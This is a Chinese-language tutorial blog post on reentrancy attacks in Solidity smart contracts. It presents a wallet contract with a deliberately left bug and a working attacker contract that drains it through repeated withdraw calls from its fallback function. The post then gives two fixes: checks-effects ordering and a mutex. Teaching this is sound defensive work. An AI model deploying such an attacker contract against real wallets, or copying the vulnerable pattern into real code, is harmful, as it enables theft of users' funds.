---
title: solidity 重入攻击和预防
categories:
  - blockchain
date: 2020-09-21 22:32:48
tags:
---

solidity 执行是单线程事务执行的，所以没有并发也就没有了竞态，所以怎么可以进行重入攻击呢？


如下所示代码，警告⚠️：下面代码有严重bug！

```Solidity
pragma solidity ^0.7.0;

interface IWallet {
    function deposit() external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _address) external view returns (uint256);
}

contract Victim is IWallet {
    mapping(address => uint256) public balances;

    function deposit() public payable override {
        balances[msg.sender] += msg.value;
    }

    function balanceOf(address _address) public view override returns (uint256){
        return balances[_address];
    }
    
    function withdraw(uint _amount) public override {
        require(balances[msg.sender] >= _amount);
        (bool success,) = msg.sender.call{value: _amount}(new bytes(0));
        require(success);
        balances[msg.sender] -= _amount;
    }
}
```

这是一个钱包，之前存取，看起没有什么问题，但是如果我们withdraw发送到一个合约里面，我们可以利用合约重新调用 withdraw 就可以耗尽钱包里所有的钱。

```Solidity
contract Hacker {
    address payable public owner;
    IWallet public wallet;

    constructor (IWallet _wallet) {
       owner =  msg.sender;
       wallet = _wallet;
    }

    function deposit() public payable {
        wallet.deposit{value: msg.value}();
    }
    
    function withdraw() public payable {
        require(msg.sender == owner);
        wallet.withdraw(wallet.balanceOf(address(this)));
    }

    fallback() external payable {
        if (msg.sender == address(wallet)){
            uint balance = wallet.balanceOf(address(this));
            if (msg.sender.balance >= balance){
                wallet.withdraw(balance);
            }
        }
    }

    function flush() public {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
}
```

问题出在哪里？Victim.withdraw 仅开始检查了余额，然后最后才扣减余额，那么我们就可以再目标合约 fallback 里面重新调用 Victim.withdraw 直到耗尽合约内的钱。

不仅如此，耗尽之后，调用栈结束后没有检查溢出，Hacker 合约的钱凭空变的更多！

```Solidity
balances[msg.sender] -= _amount;
```

最简单的解决方式是校验完余额然后立即扣减余额，这样重入的时候余额就不会检查失败。

```Solidity
    function withdraw(uint _amount) public override {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] -= _amount; // 转账之前进行扣减
        (bool success,) = msg.sender.call{value: _amount}(new bytes(0));
        require(success);
    }
```

除此之外，我们可以设计锁机制。

```Solidity
contract Victim is IWallet {
    mapping(address => uint256) public balances;
    bool private locked;
    
    modifier Mutex {
        require(!locked, "locked!");
        locked = true;
        _;
        locked = false;
    }

    function withdraw(uint _amount) public override Mutex {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] -= _amount;
        (bool success,) = msg.sender.call{value: _amount}(new bytes(0));
        require(success);
    }
}
```